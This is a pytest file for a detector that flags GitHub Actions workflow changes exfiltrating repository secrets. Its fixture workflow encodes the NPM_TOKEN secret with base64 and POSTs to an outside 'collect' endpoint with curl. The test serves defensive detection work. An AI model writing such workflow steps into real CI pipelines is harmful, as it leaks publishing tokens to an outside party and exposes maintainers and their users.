import base64

import pytest

from app.signals.workflow_exfiltration import FetchBudget, detect_personalized_exfiltration

class DummyGitHub:
    def __init__(self, contents_map, repo_meta):
        self._contents = contents_map
        self._repo_meta = repo_meta

    async def get_repo(self, owner, repo):
        return self._repo_meta

    async def get_commit(self, owner, repo, sha):
        return {"files": [{"filename": ".github/workflows/ci.yml"}]}

    async def get_contents(self, owner, repo, path, ref=None):
        return self._contents[(path, ref)]

def _b64(text: str) -> str:
    return base64.b64encode(text.encode("utf-8")).decode("utf-8")

@pytest.mark.asyncio
async def test_personalized_exfiltration_emits_incident():
    default_workflow = """
    steps:
      - run: echo ${{ secrets.NPM_TOKEN }}
      - run: echo ${{ secrets.DOCKERHUB_TOKEN }}
    """
    changed_workflow = """
    name: Github Actions Security
    steps:
      - run: echo ${{ secrets.NPM_TOKEN }} | base64
      - run: curl -X POST https://bold-dhawan.45-139-104-115.plesk.page/collect
    """
    contents = {
        (".github/workflows", "base123"): [
            {"type": "file", "path": ".github/workflows/ci.yml"}
        ],
        (".github/workflows/ci.yml", "base123"): {
            "encoding": "base64",
            "content": _b64(default_workflow),
        },
        (".github/workflows/ci.yml", "head123"): {
            "encoding": "base64",
            "content": _b64(changed_workflow),
        },
    }
    gh = DummyGitHub(contents, {"default_branch": "main"})
    budget = FetchBudget(10)
    event = {
        "type": "PushEvent",
        "repo": {"name": "org/repo"},
        "actor": {"login": "alice"},
        "created_at": "2024-01-01T00:00:00Z",
        "payload": {
            "before": "base123",
            "after": "head123",
            "commits": [{"sha": "head123", "modified": [".github/workflows/ci.yml"]}],
        },
    }

    incidents = await detect_personalized_exfiltration(event, gh, budget)
    assert len(incidents) == 1
    inc = incidents[0]
    assert inc["kind"] == "personalized_secret_exfiltration"
    evidence = inc["_evidence"]
    assert evidence["overlap_count"] == 1
